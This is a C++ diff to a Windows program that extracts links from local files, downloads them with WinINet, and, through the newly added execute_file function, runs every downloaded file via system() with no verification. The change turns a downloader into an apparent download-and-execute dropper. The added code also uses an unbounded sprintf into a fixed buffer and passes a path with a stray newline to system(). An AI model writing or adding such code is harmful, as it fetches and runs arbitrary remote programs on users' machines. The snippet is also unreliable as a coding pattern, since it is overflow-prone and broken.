@@ -4,6 +4,7 @@
 #include "stdafx.h"
 #include <windows.h>
 #include <wininet.h>
+#include <atlstr.h>
 #include <regex>
 #include <fstream>
 #include <string>
@@ -41,6 +42,12 @@ string getFileExtention(wchar_t* fileName) {
 	return str.substr(str.find_last_of(".") + 1);
 }
 
+void printLinks(vector<string> links) { 
+	
+	for (vector<string>::iterator it = links.begin(); it != links.end(); ++it) {
+		printf("%hs\n", (*it).c_str());
+	}
+}
 void printVector(vector<WIN32_FIND_DATA> vec) { //print and save text files
 	wchar_t newPath[256];
 
@@ -84,7 +91,24 @@ void get_links_from_file(string file_string, vector<string>* links) {
 	}
 }
 
-void download_exe(vector<string> links) {
+void execute_file(wchar_t* file_path) {
+	char filepath[1000];
+	int i;
+
+	sprintf(filepath, "%ws\n", file_path);
+	printf("Checking if processor is available...");
+	if (system(NULL))
+		puts("Ok");
+	else
+		exit(1);
+	printf("Executing app...\n");
+	i = system(filepath);
+	printf("The value returned was: %d.\n", i);
+
+	getchar();
+}
+
+void download(vector<string> links) {
 	for (vector<string>::iterator iter = links.begin(), end = links.end(); iter != end; ++iter) {
 		string url = *iter;
 		wchar_t w_url[1000], w_dest_file[1000];
@@ -108,9 +132,10 @@ void download_exe(vector<string> links) {
 			DWORD dwWrite = 0;
 			WriteFile(hFile, Buffer, dwRead, &dwWrite, NULL);
 		}
-
 		CloseHandle(hFile);
 		InternetCloseHandle(internet_open_url);
+
+		execute_file(w_dest_file);
 	}
 }
 
@@ -157,7 +182,10 @@ int main(int argc, char* argv[])
 	if (readFiles(vec, links) == 1) {
 		return 1;
 	}
-	download_exe(links);
+	//printLinks(links);
+
+	download(links);
+
 	InternetCloseHandle(hConnectHandle);
 	InternetCloseHandle(hOpenHandle);
     return 0;
